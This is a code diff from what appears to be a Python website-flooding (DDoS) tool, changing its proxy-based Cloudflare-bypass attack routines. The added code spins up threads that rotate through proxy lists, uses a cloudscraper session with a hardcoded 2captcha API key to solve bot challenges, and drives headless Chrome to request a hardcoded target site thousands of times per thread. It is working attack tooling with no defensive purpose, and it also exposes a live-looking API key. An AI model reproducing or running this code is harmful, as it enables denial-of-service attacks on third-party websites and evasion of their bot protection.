@@ -539,25 +539,7 @@ def AttackCFB(url, until_datetime, scraper):
             pass
 #endregion
 
-#region PXCFB
-def LaunchPXCFB(url, th, t):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    scraper = cloudscraper.create_scraper( browser={
 
-    'provider': '2captcha',
-
-    'api_key': 'ef9e368b1b69cadb030fa20473ccd0c4'
-
-    })
-    if get_proxies():
-        proxies = open("./proxy.txt", 'r').read().split('\n')
-        
-        for _ in range(int(th)):
-            try:
-                thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper,proxies))
-                thd.start()
-            except:
-                pass
 
 def AttackPXCFB(url, until_datetime, scraper,proxies):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
@@ -586,7 +568,76 @@ def AttackPXCFB(url, until_datetime, scraper,proxies):
         except Exception as e:
             print('falid--------------',e)
             pass
-#endregion
+def LaunchPXCFB(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    scraper = cloudscraper.create_scraper( browser={
+
+    'provider': '2captcha',
+
+    'api_key': 'ef9e368b1b69cadb030fa20473ccd0c4'
+
+    })
+    proxies = open("./proxy.txt", 'r').read().split('\n')
+
+    if isinstance(proxies, list) and proxies:
+
+
+        for i in range(int(th)):
+            try:
+                proxy = random.choice(proxies).strip().split(":")
+                time.sleep(1)
+                thd = threading.Thread(target=AttackPXCFB2, args=(url, until, scraper,proxy,th))
+                thd.start()
+                proxy = random.choice(proxies).strip().split(":")
+                AttackPXCFB2(url, until, scraper,proxy,th)
+                thread.join()
+
+            except:
+                pass
+
+def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+
+                from selenium import webdriver
+                from selenium.webdriver.chrome.service import Service
+                from selenium.webdriver.chrome.options import Options
+                # Proxy configuration
+                proxy = f"http://{proxies[0]}:{proxies[1]}"
+
+                # Set up Chrome options for headless mode and proxy
+                chrome_options = Options()
+                chrome_options.add_argument("--headless")  # Run in headless mode
+                chrome_options.add_argument("--no-sandbox")  # Disable sandboxing
+                chrome_options.add_argument("--disable-dev-shm-usage")  # Overcome limited resource problems
+
+                chrome_options.add_argument(f'--proxy-server={proxy}')
+
+                # Specify the path to the Chrome binary
+                chrome_options.binary_location = '/usr/bin/google-chrome'  # Update with actual path if different
+
+                # Path to your ChromeDriver executable
+                chromedriver_path = '/usr/bin/chromedriver'  # Update with the actual path
+
+                # Create a new instance of the Chrome driver
+                service = Service(chromedriver_path)
+                driver = webdriver.Chrome(service=service, options=chrome_options)
+
+                # Define the URL you want to scrape
+                url = 'https://xvideos68.com'
+                for _ in range(int(th) * 5000):
+                    driver.get(url)
+                    # Get the page source
+                    page_source = driver.title
+                    print(page_source,'------',proxy)
+                # Close the driver
+                driver.quit()
+
+
+        except Exception as e:
+            print('falid--------------',proxy)
+            pass
+
 
 #region CFPRO
 def LaunchCFPRO(url, th, t):
